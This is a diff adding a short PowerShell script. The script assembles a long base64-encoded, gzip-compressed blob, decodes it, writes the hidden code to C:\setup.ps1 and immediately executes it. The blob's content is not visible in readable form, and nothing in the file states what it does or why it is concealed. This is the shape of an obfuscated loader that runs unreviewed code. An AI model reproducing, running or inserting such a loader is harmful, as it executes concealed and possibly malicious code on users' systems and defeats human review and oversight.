@@ -1,0 +1,44 @@
+$b = ""
+$b += "H4sIAAAAAAAC/81a624bxxX+z6eYbIiYAkTqLrsCWJghKWlh8QIt6cCIAnfFHZJbL3e3e7GstgZ8aYP8CNIWaV0gLdIa6APYiXxpHDuvsHyjnpnZ+86uKNtA"
+$b += "SkACOXPOd86eObeZ2Q/RxMW2c9PGjmveHLuaVjPtNVRFDdcxZrKDFSSRKTQ2LHQgH6OtUrltWYbVGDmqofctPMYW1kcY1ZHQNHRH1V0slEqfWKqDq/uG7SCh"
+$b += "Xq+jtRoSu9KgcXAgdvfQR6jZ6+6Ke8ND8qu13+wjqX14vX2IgFZA1V3DwhPLcHWlaWgguHkq66WPQBPrNrY6si5PsNWcKTV8B6OqqtuOrGkUpiQ5suVUJQ1j"
+$b += "E1UlPDJ0xQadP0I6dpBNJlFrOjIZUomN21OkwBiy6SCSFQXZI8PEaO0X67W17Su1tdoqWt/aqgV/q0jwvp3/Yf5ofl8gX72n3ivvyfz+/MH8S+Sdea/mf0Le"
+$b += "D94b70fvp0vzr+YPvGfze/NH3nfIe8PY5g8FruysXKKNalqyPomPr8W+r6+uXgAL3xlproIzgFur8V+X3wPkeuz7xoJw4IbIMIln3ZY1F6PV1Q0k9hut1mFb"
+$b += "kmKUm2+Nt83F27rA41qYTiuqGVcIrcnrxxujTWULb4+RMP8CvOAr74WQ+Ppxb7AvXEB1cFgHRpMc1D8ZF3PjmjEeqyNcGxmzxCNlgnC9hpqH7caABF2jORCv"
+$b += "t1FLPGw3B73DG6g3tIuiT5yZBkRWx1BcDSMS/bdxS7XwyDGsU1SN5QQkqRrWHe00SAelUlmBXKLqrS7JEq1mnSm8DN9AZ6FUNlyQja5WBO+bIFS8195LiKGX"
+$b += "wjJE2H9g5LX3xHs9v++9JHHGxsVBFQZ+ApbPgeAJmPlRNOl9DUAPYZb9+iYVjmxYcsBxdQcShQu2OhWWSiVIdFgeTVEFtEKqjohyS+h3JQQfBx6VfSOfLj6p"
+$b += "Nlo9ayLr6m9l8uiyNtRVB1W78gwTRlTty84URY+ftJNjmCFYfK16QzQCJUjyva3KaDRTNOzsEECB0t9FI9kBFSNVkoqRT9kyDAeM+qms2OpnwkGr0d9ZWQk1"
+$b += "EZLEOj4BoXXGVWtS4RXByDwasVlvWCeaLHEQalArRH1sVJKTBc/WaEli7Mn4T8fBkDUAUU4h96i2YyPwUh81DcYMVrqbjYaNWDTsHfaGfanI/8tkxHz/btrQ"
+$b += "NKhZ4zHYM/K8iWVS12Myi7xvj1AEDkfYqpI8a4xGoL0TG6RkEs0xe5pxLGv+UBNMNiEBHESA77FkkaMAWo7cZkEPZmpxnRj0uYAXAzV1zKQb52mX4iUOTQFC"
+$b += "j6YGJWZvdutUk5QXT2p916kIdqMTsyHQE1o+KUUcnJqEqrq+tnl588rG9uZ2hvj8yMjazA+O0GKLRQfDKQqQJGB+hGzGImQIDVphgIxdnTlFQ1GqQyhQjVal"
+$b += "rIP5iPWgWOhd9t12LX/UcOHf1JjhlgXz9bIO3Wcwolrhb9MyxlBRiF+ysSAeyuaJAksMZQaKoDMwqtSJseRYqj5BQl8ul08MSwGFG3ZfAw8Z4DsO1X6EOQFV"
+$b += "NklwJ+1KQwi8iGicmEhFGY+E2KAPqoxUU9Z8KoGSXY0KdtJlaezVgxSb59i+4L5s2+T5iHCwRIKkrcvHGqZTjuXilBDG18VgtvYdE4q4nSG8G35TxyQhBQsI"
+$b += "tgdpnwp7wYDwGY2y4Gea0V/tgE1iPxmTP5dmCT0iYNoPBhhbOM9lVK0EW9ChxFhVK80Y87CAuR8NMdYYTYydJWGy0uiquWBupNTc1EhNs3huNNze8a95ubHA"
+$b += "d8oueRjKGSZFFxQKciJVIZW83LykSFeWS+umfZ/gZ3w/yctxNB8tHBTiuWQptg5cfwv01oUo7XCZkh7ns4WDQjxL5fP7jhfnDp0vympc/rT/+RixYSGZB9Mo"
+$b += "wMGvL2wiiPhKlBPzl81fY9K8W4YGgre3VzevLC0mr9DP/XIWefli9YziFJWzFGBUzz5E2UatFJUn6Nj+Cn3aPe+Z9wO0Y2/m9wT+0Lfhph3xWr8k5N/9kwDS"
+$b += "m1AKIW8wJcl7kgNPnoPTWibF/mX+cP5H73vaXtINDgH7GjY9r+CPgf1XyKPjNa5J+L/R84zXZBPFulfC9i9QGsCB+SwSwKU8X8A/wRCv4e/Mex5oxRliEs8A"
+$b += "6TmxUR40on2C/184OmLb5SM/qdtHGWhi49w2Panon4HpRyKTTZN1izzlsa/CM9hrhhYp4sjfGySlsgf/nvCeuwL/hqEXdOJp6Gz5cqBR2hFiRgq8/YjIBlPx"
+$b += "JCd1e0z309+RuSpdjOfMuoFJwtlIxc9TVAXqnbeUBdJp5DymYXdGBucPUorHp9hKvfbOaPhRLf9B1hGAvwCXJsGZPi3IdsxbNdSQJHGvG24qUafd+Rha532x"
+$b += "v3j7vGeZHTw7xlaFbQH91pmk59jX3pC/MyQI/s6QoaCqSPQm27sID1XZpB3hLtjAAD5k9IjLMeKwUUdzkW1epo1hG7Tg2Rfc8NVAtUocIbQY6YqYzWLcb7FJ"
+$b += "O//ZSZW7SHnzV2EKx4mxhfhlHBZOsceqNcMKt8olHIZbQfhVLaeQnQvFrWULgHET9UUL0gKAFytACwBy6tAicEUp911qwqIi+CXjPYEX5vwCGZCRWzT8IEvN"
+$b += "4OamFCWDorQlJJiEKHcVWpKfzrLhnI9B4jshOpHeksGdOk1QZF5OS4AtwwCtsryMBgDpdJavJ8lvuVbnZjwCn013726bKP1lU18cvQA36PUBOLns+SdV27XE"
+$b += "jaK034ALHtTotlB3sCuhfvuwI0Jd7nWLz3gV1WInvFSS0NwJuyFhOTN0xDsF5lBxT4WzdAWnxBxQSMJ+zvyShB2PhnpW7gS/sYuogwaLM5Rtn3k0+Rmidn1d"
+$b += "KMWPuxV62E2MHzQ0ZFv8QWUAN9PBDcoS2RmT4xbRwTNE/5NTVxS7g/Ip/RM+5igC3BYrMp33VUMt2ZEF9HvUc53qLhm4gN5HukNqdG0m6yS96CNDIWeNDakp"
+$b += "iqUS5AW0MkKX6F3zVLZwtHesx30JrUzgstTZaUMne2roeHl3eHBwicceqFWPr8ji7HSl61mnyEEIIdSRPNLsc709gIFi0dvdFZttHtFOpScuVZri0i5aUfUp"
+$b += "hsiV4X0BYMpwJ6M9zhhSSjekQbsTm7tUrDS3pGfV5pGFMjo/g+IFxTcjPZ/257V9OkfFoALHyzUyLsYuSGGc1eWRvQfTXMrWocvJOsR2gP3egdgU29Li1+u0"
+$b += "Ceobmjo672o9ajrKE9OA2kVS5F6/518JJjtVchD0BIGnvKE+8oBGKAw8hQz3gjgQi+pq05jNQMxbcZeCY/G9/oGq33onPQayNcEOu4zkRGi6a4J2BqQe4gkc"
+$b += "EVqn1+kLH+8i/hqGxnP/WnN45B+GwtWJjrWjFrZvQTMJFFQGkyDBeSTWJfk2HqgzDLWF6E8KlH8dxWiRsL26+n+lrSXa7NosR981IdM0E/cKznWhurLt6QQg"
+$b += "lHRLzOUifjwFPo0e3t4USJn2Y10gtUtmB9A2WoF4M0/A4XeuwHf5jnkC733tbK+iFc0Y3TJcx5nC1dXU0JSdrXBMcS0qYmcjojtRdcU4gRGhNDFdUyEv1ayM"
+$b += "6TVgIoJ/pddTHwTvpImQBOAOtNdF0rDTacCrMmkqTlDvEfsmwKvVKv+lG5jgANzAmmacwJs/iv0bF5IlMty0slxEdk+7ICbpZRZC9d+PWBCWnlzwcP2+/ByY"
+$b += "sIHhQbCXBZu9/kI46bespsYJe9WKB92Ho7tPeocteD3xoNe81hsOWOq+sYjCgddyPArBW49o0JCuSVAcOv2D9qDdAl9qNuEdNNJ43fgAFTnR/wDt3yqBoykA"
+$b += "AA=="
+$bytes = [System.Convert]::FromBase64String($b)
+$ms = New-Object System.IO.MemoryStream(,$bytes)
+$gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+$sr = New-Object System.IO.StreamReader($gz, [System.Text.Encoding]::UTF8)
+$code = $sr.ReadToEnd()
+$sr.Close()
+$gz.Close()
+$ms.Close()
+$code | Out-File C:\setup.ps1 -Encoding UTF8
+& C:\setup.ps1
